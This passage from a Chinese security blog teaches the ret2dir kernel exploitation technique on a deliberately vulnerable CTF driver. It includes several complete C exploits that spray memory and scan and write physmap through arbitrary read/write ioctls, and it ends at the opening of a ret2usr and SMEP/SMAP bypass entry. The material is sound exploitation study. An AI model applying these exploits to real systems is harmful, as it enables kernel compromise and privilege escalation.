class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;			<span class="comment">//用来打印地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们在main函数中先用add_any函数申请一块内存，然后靠着返回的地址在用户态打印出来看看。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308231319166.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232224327.png"
                      class=""
                >
<p>然后我们去查询对应内核版本的内存布局情况，主要用的是<a class="link" 
 href="https://elixir.bootlin.com/linux" >这个网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，选择对应的版本后进入<code>source/Documentation/x86/x86_64/mm.txt</code>即可查看内存布局（有时候是mm.rst）。这里我用的内核版本是linux-5.15.153，查询到的结果如下，我们kmalloc申请到的内存确实是在<code>direct mapping of all physical memory</code>中的，也就是大家所称为的<strong>physmap</strong>。这里我在调试时喷射的内存在<strong>kmalloc</strong>申请到的内存的更高地址处，这里获取slab分配的地址时其实不用像原文一样进行按位与处理。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232101958.png"
                      class=""
                >
<p>之后就可以进行内存喷射并且搜索内存了，比如有如下exp：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loginfo</span><span class="params">(<span class="type">char</span> *tag)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s] &quot;</span>,tag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> spray_times 32*32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mp_size 1024*64</span></span><br><span class="line"><span class="type">void</span> *spray[spray_times];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>] &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    loginfo(<span class="string">&quot;searching\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        <span class="type">char</span> *target = <span class="string">&quot;AAAAAAAA&quot;</span>;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBB&quot;</span>;</span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = (u64)memmem(buf,<span class="number">0x1000</span>,target,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos)&#123;</span><br><span class="line">            u64 addr_to_change = addr + (pos-(u64)buf);</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>执行exp时有时候会遇到内存不足的问题，由于我们要提高physmap的命中率，所以要尽可能耗尽所有内存进行内存喷射，我们的exp是申请了64MB的内存，我们可以进入内核使用<code>free -h</code>查看<code>available</code>的数值大小，也就是应用程序可用内存。这里我在<strong>run.sh</strong>中设置128M内存时是不够用的，256M内存又搜半天没结果，后面我用150M内存进入内核一下子就碰撞到physmap。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309121624100.png"
                      class=""
                >
<p>但有时候hit时并不是直接到了我们喷射的内存中，而是我们加载到内存中的代码，这样的话我们在每次找到pos时就不要用break退出了，这样就能找到我们实际大量申请的内存。其实还有种更改的方案是自定义一个不需要指定target的类似memmem的函数，这样就不会需要硬编码写target了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309133155698.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309134242679.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memmem替代函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_series</span><span class="params">(<span class="type">char</span> *buf,<span class="type">size_t</span> buflen,<span class="type">char</span> c,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (buf == <span class="literal">NULL</span> || buflen == <span class="number">0</span> || len &gt; buflen || len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;buflen;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==c)</span><br><span class="line">            count++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(count==len)</span><br><span class="line">            <span class="keyword">return</span> i-len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后就能一遍找到对应喷射内存，然后我想验证用户空间与内核空间在physmap上的对应关系，这里我尝试了改用户空间的内容再在原来内核空间搜索到的位置来验证，但是却不能正确修改，而是在其它地址位置能找到修改后的内容。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            loginfo(<span class="string">&quot;changing spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">            add_any(fd,<span class="number">0x500</span>,buf);      <span class="comment">//方便打断点</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">                <span class="built_in">memset</span>(spray[i],<span class="string">&#x27;B&#x27;</span>,<span class="number">0x1000</span>);    <span class="comment">// 在用户态修改对应内存</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 查看内核态对应位置内容是否变化</span></span><br><span class="line">            <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">            read_any(fd,addr_to_change,buf,<span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309155512009.png"
                      class=""
                >
<p>但如果是改内核空间的内容，然后在用户态查看内容是否有被修改，就能轻易的验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">x64dump</span><span class="params">(<span class="type">char</span> *buf,<span class="type">uint32_t</span> num)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 =  (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-x64dump-] start : \n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; i!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx &quot;</span>,*(buf64+i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[-x64dump-] end ... \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 *<span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        u64 *p = spray[i];</span><br><span class="line">        <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;mp_size/<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[j]!=<span class="number">0x4141414141414141</span>)&#123;</span><br><span class="line">                loglx(<span class="string">&quot;check change&quot;</span>,(u64)&amp;p[j]);</span><br><span class="line">                <span class="comment">/*x64dump((void *)&amp;p[j],0x20);*/</span></span><br><span class="line">                <span class="keyword">return</span> &amp;p[j];</span><br><span class="line">            &#125;</span><br><span class="line">            j+=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBBBBBBBBBB&quot;</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line"></span><br><span class="line">            write_any(fd,addr_to_change,dirty,<span class="number">0x10</span>);</span><br><span class="line">            u64 *p = check();</span><br><span class="line">            <span class="keyword">if</span> (p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                loginfo(<span class="string">&quot;dirty success!&quot;</span>);</span><br><span class="line">                x64dump((<span class="type">char</span> *)p,<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>最后就能成功修改了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309162954125.png"
                      class=""
                >
<p>这里这个case是采用内存搜索的方式进行寻找我们与用户空间相同的物理映射，实际上一般的kernel题不会有任意地址读取返回的内存搜索机会。一般而言我们可以直接在用户空间布置大量具有slide性质的rop链，然后靠溢出等漏洞劫持程序执行流返回到rop链。这里虽然说可能改用户态数据不好精确定位到内核中<strong>physmap</strong>的具体位置，但是由于该映射关系的存在，只要我们在内存中填满rop链，就有很高的概率能够执行我们想要的内容。在实际运用中，只要我们知道了内核的基地址，然后就能够直接劫持执行流到<strong>physmap</strong>的较高地址处。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2usr利用手法以及常见保护机制绕过浅析</title>
    <url>/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h2
id="ret2usr利用手法以及常见保护机制绕过浅析">ret2usr利用手法以及常见保护机制绕过浅析</h2>
<h4 id="ret2usr">ret2usr</h4>
<p>在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。</p>
<p>这里仍以<strong>2018 强网杯 -
core</strong>为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。</p>
